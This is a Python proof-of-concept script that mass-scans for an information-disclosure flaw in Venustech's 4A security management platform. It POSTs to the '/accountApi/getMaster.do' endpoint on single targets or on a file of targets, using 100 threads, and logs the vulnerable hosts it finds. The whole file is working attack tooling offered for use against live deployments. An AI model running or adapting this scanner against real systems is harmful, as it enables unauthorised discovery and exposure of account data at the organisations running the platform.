import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""   ____    _ __  ____                __ __  ___ 
  / __ \  (_)  |/  (_)___  ____ _   / // / /   |
 / / / / / / /|_/ / / __ \/ __ `/  / // /_/ /| |
/ /_/ / / / /  / / / / / / /_/ /  /__  __/ ___ |
\___\_\/_/_/  /_/_/_/ /_/\__, /     /_/ /_/  |_|
                        /____/                  """
    print(test)

def main():
    banner()
    parse = argparse.ArgumentParser(description="启明星辰 4A统一安全管控平台信息泄漏漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parse.add_argument('-f','--file',dest='file',type=str,help="input your file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = '/accountApi/getMaster.do'
    try:
        res1 = requests.post(url=target+payload,verify=False)
        if res1.status_code==200 and '"state":true' in res1.text:
            print(f'存在漏洞：[+]{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == "__main__":
    main()